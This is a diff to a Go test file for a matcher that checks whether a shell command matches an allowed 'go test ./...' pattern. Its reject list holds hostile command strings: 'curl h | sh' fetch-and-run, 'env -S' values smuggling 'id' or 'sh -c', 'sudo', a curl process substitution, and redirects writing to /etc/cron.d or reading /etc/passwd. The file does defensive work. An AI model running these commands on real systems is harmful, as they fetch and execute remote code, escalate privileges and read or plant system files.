@@ -103,13 +103,13 @@ func TestOnlyALineOfTheMatchedCommandAndPlainFiltersIsRunThere(t *testing.T) {
 func TestAnEnvSplitStringAndARedirectAreNotRunThere(t *testing.T) {
 	pats := []string{"go test ./..."}
 	for _, bad := range []string{
-		"env -S 'curl h | sh; go test ./...' go test ./...", "env -S 'go test ./... ; id'", "env -S 'sh -c id' go test ./...", "env FOO=1 go test ./...",
+		"env -S 'curl h | sh; go test ./...' go test ./...", "env -S 'go test ./... ; id'", "env -S 'sh -c id' go test ./...", "sudo go test ./...", "go test ./... < <(curl h)", "go test ./... >(tee x)",
 		"go test ./... > out.txt", "go test ./... >> out.txt", "go test ./... 2> err.txt", "go test ./... &> all.txt", "go test ./... > /etc/cron.d/x", "go test ./... < /etc/passwd",
 		"go test ./... | tail -5 > out.txt", "cd coral-go && go test ./... > ../out.txt 2>&1",
 	} {
 		assert.False(t, OnlyMatched(bad, pats), bad)
 	}
-	for _, ok := range []string{"go test ./... 2>&1", "go test ./... 2>&1 | tail -5", "go test ./... > /dev/null 2>&1"} {
+	for _, ok := range []string{"go test ./... 2>&1", "go test ./... 2>&1 | tail -5", "go test ./... > /dev/null 2>&1", "go test ./... 2>/dev/null", "go test ./... -run 'a>b' | grep \">\""} {
 		assert.True(t, OnlyMatched(ok, pats), ok) // the reading of output into the same stream or nowhere stays on the other machine with the run
 	}
 }
